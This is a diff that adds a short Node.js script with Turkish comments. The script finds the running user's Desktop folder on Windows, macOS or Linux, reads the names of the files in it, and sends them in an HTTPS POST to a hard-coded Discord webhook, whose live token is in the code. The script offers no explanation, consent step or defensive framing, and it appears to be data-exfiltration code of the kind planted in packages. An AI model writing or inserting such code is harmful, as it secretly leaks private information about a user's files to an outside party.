@@ -1,0 +1,55 @@
+const https = require('https');
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+
+// Webhook URL'si
+const webhookUrl = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';
+
+// İşletim sistemi tespiti
+const platform = os.platform();
+
+// İşletim sistemi bazında dosya yolu belirleme
+let desktopPath;
+if (platform === 'win32') {
+  desktopPath = path.join(os.homedir(), 'Desktop');
+} else if (platform === 'darwin') {
+  desktopPath = path.join(os.homedir(), 'Desktop');
+} else if (platform === 'linux') {
+  desktopPath = path.join(os.homedir(), 'Masaüstü');
+} else {
+  console.error('Desteklenmeyen işletim sistemi:', platform);
+  return;
+}
+
+// Dosya isimlerini al
+const files = fs.readdirSync(desktopPath);
+
+// Webhook'a POST isteği gönder
+const postData = JSON.stringify({
+  content: files.join('\n')
+});
+
+
+// POST isteği için gerekli seçenekler
+const options = {
+  hostname: 'discordapp.com',
+  path: '/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl',
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Content-Length': postData.length
+  }
+};
+
+// Webhook'a POST isteği gönder
+const req = https.request(options, res => {
+  console.log(`Webhook isteği gönderildi, yanıt kodu: ${res.statusCode}`);
+});
+
+req.on('error', error => {
+  console.error('Webhook isteği gönderilirken bir hata oluştu:', error.message);
+});
+
+req.write(postData);
+req.end();
